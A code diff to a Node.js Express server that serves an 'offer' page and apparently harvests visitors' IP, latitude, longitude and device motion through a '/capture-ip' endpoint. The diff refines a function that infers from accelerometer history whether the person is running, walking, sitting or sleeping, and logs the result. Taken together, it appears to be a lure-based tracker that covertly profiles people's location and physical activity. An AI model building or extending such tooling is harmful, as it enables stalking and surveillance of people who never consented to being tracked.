@@ -11,7 +11,7 @@ app.get('/', (req, res) => {
     res.sendFile(__dirname + '/offer.html');
 });
 
-function detectActivity(motion, orientation) {
+function detectActivity(motion, orientation, motionHistory) {
     if (!motion) return 'No Motion Data';
     
     const x = motion.x || 0;
@@ -20,14 +20,36 @@ function detectActivity(motion, orientation) {
     const totalAccel = Math.sqrt(x*x + y*y + z*z);
     const tilt = orientation ? Math.abs(orientation.beta || 0) : 0;
     
-    console.log(`Motion Debug: x=${x}, y=${y}, z=${z}, total=${totalAccel}, tilt=${tilt}`);
+    let activity = 'Unknown';
+    let confidence = 50;
     
-    if (totalAccel > 15) return 'Running (85%)';
-    if (totalAccel > 8) return 'Walking (80%)';
-    if (totalAccel > 3) return 'Standing/Moving (70%)';
-    if (tilt > 60) return 'Sleeping/Lying (75%)';
-    if (totalAccel < 1.5) return 'Sitting/Still (85%)';
-    return 'Standing (65%)';
+    if (motionHistory && motionHistory.length > 10) {
+        const magnitudes = motionHistory.map(h => h.magnitude);
+        const avg = magnitudes.reduce((a,b) => a+b) / magnitudes.length;
+        const variance = magnitudes.reduce((sum, val) => sum + Math.pow(val - avg, 2), 0) / magnitudes.length;
+        const stdDev = Math.sqrt(variance);
+        
+        // Pattern analysis
+        if (avg > 12 && stdDev > 3) { activity = 'Running'; confidence = 90; }
+        else if (avg > 6 && stdDev > 2) { activity = 'Walking'; confidence = 85; }
+        else if (avg > 2 && stdDev > 1) { activity = 'Standing/Moving'; confidence = 75; }
+        else if (tilt > 70) { activity = 'Sleeping/Lying'; confidence = 80; }
+        else if (avg < 1 && stdDev < 0.5) { activity = 'Sitting/Still'; confidence = 90; }
+        else { activity = 'Standing'; confidence = 70; }
+        
+        console.log(`Advanced Analysis: avg=${avg.toFixed(2)}, stdDev=${stdDev.toFixed(2)}, tilt=${tilt}`);
+    } else {
+        // Fallback to simple detection
+        if (totalAccel > 15) { activity = 'Running'; confidence = 75; }
+        else if (totalAccel > 8) { activity = 'Walking'; confidence = 70; }
+        else if (totalAccel > 3) { activity = 'Standing/Moving'; confidence = 65; }
+        else if (tilt > 60) { activity = 'Sleeping/Lying'; confidence = 70; }
+        else if (totalAccel < 1.5) { activity = 'Sitting/Still'; confidence = 80; }
+        else { activity = 'Standing'; confidence = 60; }
+    }
+    
+    console.log(`Motion Debug: x=${x}, y=${y}, z=${z}, total=${totalAccel}, tilt=${tilt}`);
+    return `${activity} (${confidence}%)`;
 }
 
 app.post('/capture-ip', (req, res) => {
@@ -36,7 +58,7 @@ app.post('/capture-ip', (req, res) => {
     const lng = req.body.lng;
     
     const timestamp = new Date().toISOString();
-    const activity = detectActivity(req.body.motion, req.body.orientation);
+    const activity = detectActivity(req.body.motion, req.body.orientation, req.body.motionHistory);
     const motionInfo = req.body.motion ? `
 Motion Data:
   Acceleration: x=${req.body.motion.x}, y=${req.body.motion.y}, z=${req.body.motion.z}
